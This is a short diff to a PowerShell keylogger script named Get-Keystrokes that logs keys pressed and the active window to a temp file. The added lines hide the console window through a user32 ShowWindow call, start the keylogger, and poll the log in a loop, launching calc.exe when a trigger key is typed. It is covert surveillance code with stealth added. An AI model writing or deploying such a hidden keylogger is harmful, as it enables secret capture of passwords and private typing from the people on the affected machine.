@@ -1,4 +1,8 @@
-﻿function Get-Keystrokes {
+﻿$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+
+function Get-Keystrokes {
 <#
 .SYNOPSIS
     Logs keys pressed, time and the active window.
@@ -364,14 +368,14 @@
 
     if ($PassThru.IsPresent) { return $PowerShell }
 }
+
 Get-Keystrokes
-$scripp = {
+
 while ($true){
     $key = ((gc $env:USERPROFILE\AppData\Local\Temp\key.log -Tail 1) -split ",").Trim('"')
-    if ($key -ceq "P"){
-           "##############" > C:\Users\e5k\AppData\Local\Temp\key.log
+    if ($key -ceq "c"){
+           "##############" > $env:USERPROFILE\AppData\Local\Temp\key.log
            & calc.exe
     }
+sleep -Milliseconds 200
 }
-}
-Start-Job -ScriptBlock $scripp
